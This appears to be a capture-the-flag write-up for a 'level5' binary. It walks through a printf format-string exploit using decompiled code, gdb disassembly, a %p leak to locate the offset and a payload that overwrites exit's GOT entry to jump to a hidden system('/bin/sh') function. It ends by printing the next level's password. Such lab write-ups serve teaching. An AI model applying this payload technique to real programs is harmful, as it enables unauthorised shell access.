scp -P 4242 level5@10.11.200.132:/home/user/level5/level5 .

/--------------------------------------------------------/
    int32_t main(int32_t argc, char** argv, char** envp) __noreturn
        0804850a  n()
        0804850a  noreturn

    int32_t n() __noreturn
        080484e5  void var_20c
        080484e5  fgets(&var_20c, 512, *stdin)
        080484f3  printf(&var_20c)
        080484ff  exit(status: 1)
        080484ff  noreturn

    int32_t o() __noreturn
        080484b1  system(0x80485f0)  {"/bin/sh"}        ## our target address
        080484bd  _exit(status: 1)
        080484bd  noreturn

/--------------------------------------------------------/

    Main function calls n(). There is a function o() which is never called.

    gdb level5
        disas n
            Dump of assembler code for function n:
                0x080484c2 <+0>:     push   %ebp
                0x080484c3 <+1>:     mov    %esp,%ebp
                0x080484c5 <+3>:     sub    $0x218,%esp
                0x080484cb <+9>:     mov    0x8049848,%eax
                0x080484d0 <+14>:    mov    %eax,0x8(%esp)
                0x080484d4 <+18>:    movl   $0x200,0x4(%esp)
                0x080484dc <+26>:    lea    -0x208(%ebp),%eax
                0x080484e2 <+32>:    mov    %eax,(%esp)
                0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
                0x080484ea <+40>:    lea    -0x208(%ebp),%eax
                0x080484f0 <+46>:    mov    %eax,(%esp)
                0x080484f3 <+49>:    call   0x8048380 <printf@plt>
                0x080484f8 <+54>:    movl   $0x1,(%esp)
                0x080484ff <+61>:    call   0x80483d0 <exit@plt>  ## exit is called after printf

        disas o
            Dump of assembler code for function o:
                0x080484a4 <+0>:     push   %ebp
                0x080484a5 <+1>:     mov    %esp,%ebp
                0x080484a7 <+3>:     sub    $0x18,%esp
                0x080484aa <+6>:     movl   $0x80485f0,(%esp)
                0x080484b1 <+13>:    call   0x80483b0 <system@plt>
                0x080484b6 <+18>:    movl   $0x1,(%esp)
                0x080484bd <+25>:    call   0x8048390 <_exit@plt>
/--------------------------------------------------------/

python -c 'print "AAAA" + " %p"*30 ' > /dev/shm/memoryfinder ; cat /dev/shm/memoryfinder - 1| ./level5

AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520
x041 found in 4th parameter

/--------------------------------------------------------/

the syntax would be:
    <target address> + <offset> + <address to write>

/--------------------------------------------------------/

The target address will be the instruction called by exit(). To find this address:
    [...]
    0x080484ff <+61>:    call   0x80483d0 <exit@plt>
    [...]

    (gdb) disas exit
    Dump of assembler code for function exit@plt:
    0x080483d0 <+0>:     jmp    *0x8049838
    0x080483d6 <+6>:     push   $0x28
    0x080483db <+11>:    jmp    0x8048370

Lets substitute exit address and write the address of o() vulnerable function.
To calculate the offset:
printf "%d\n" "0x080484a4"
134513828 - len("\xd0\x83\x04\x08") = 134513824


exit address: \x38\x98\x04\x08

/--------------------------------------------------------/
python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n" ' > /dev/shm/exploit; cat /dev/shm/exploit - | ./level5

/--------------------------------------------------------/
whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31